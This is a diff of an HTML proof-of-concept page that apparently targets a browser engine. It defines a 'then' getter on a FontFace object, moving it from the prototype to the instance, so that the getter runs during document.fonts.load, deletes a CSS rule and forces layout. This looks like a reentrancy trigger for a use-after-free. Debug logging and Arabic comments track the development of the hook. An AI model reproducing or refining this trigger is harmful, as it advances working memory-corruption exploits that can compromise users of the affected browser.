@@ -7,7 +7,7 @@
 </head>
 <body>
     <div id="debug" style="color: #0f0; font-family: monospace; font-size: 18px; white-space: pre-wrap;">
-        [1] Script Starting...
+        [1] Starting Instance Hook...
     </div>
 
     <script>
@@ -18,45 +18,36 @@
         }
 
         window.onload = () => {
-            try {
-                log("Script Loaded.");
-                
-                let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
-                document.fonts.add(A);
-                log("FontFace added to document.fonts.");
+            let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+            document.fonts.add(A);
+            
+            let fired = false;
 
-                let fired = false;
-                
-                // تشخيص الـ Hook
-                Object.defineProperty(FontFace.prototype, 'then', {
-                    configurable: true,
-                    get() {
-                        if (!fired && this === A) {
-                            fired = true;
-                            log("HOOK TRIGGERED! (Object detected)");
-                            
-                            // الحذف
-                            document.getElementById('s').sheet.deleteRule(0);
-                            log("Rule deleted.");
-                            
-                            document.body.offsetTop;
-                            log("Layout forced.");
-                        }
-                        return undefined;
+            // تغيير جذري: تعريف الـ Hook على الكائن A مباشرة وليس على الـ Prototype
+            Object.defineProperty(A, 'then', {
+                configurable: true,
+                get() {
+                    if (!fired) {
+                        fired = true;
+                        log("INSTANCE HOOK TRIGGERED!");
+                        
+                        document.getElementById('s').sheet.deleteRule(0);
+                        document.body.offsetTop;
+                        
+                        log("Rule deleted.");
                     }
-                });
-                log("Hook applied to prototype.");
+                    return undefined;
+                }
+            });
 
-                log("Calling fonts.load...");
-                document.fonts.load('1em x', 'AB').then(() => {
-                    log("Load completed.");
-                }).catch((e) => {
-                    log("Load caught error: " + e.message);
-                });
+            log("Instance hook applied.");
+            log("Calling fonts.load...");
 
-            } catch (err) {
-                log("CRITICAL ERROR: " + err.message);
-            }
+            document.fonts.load('1em x', 'AB').then(() => {
+                log("Load completed.");
+            }).catch((e) => {
+                log("Load caught error: " + e.message);
+            });
         };
     </script>
 </body>
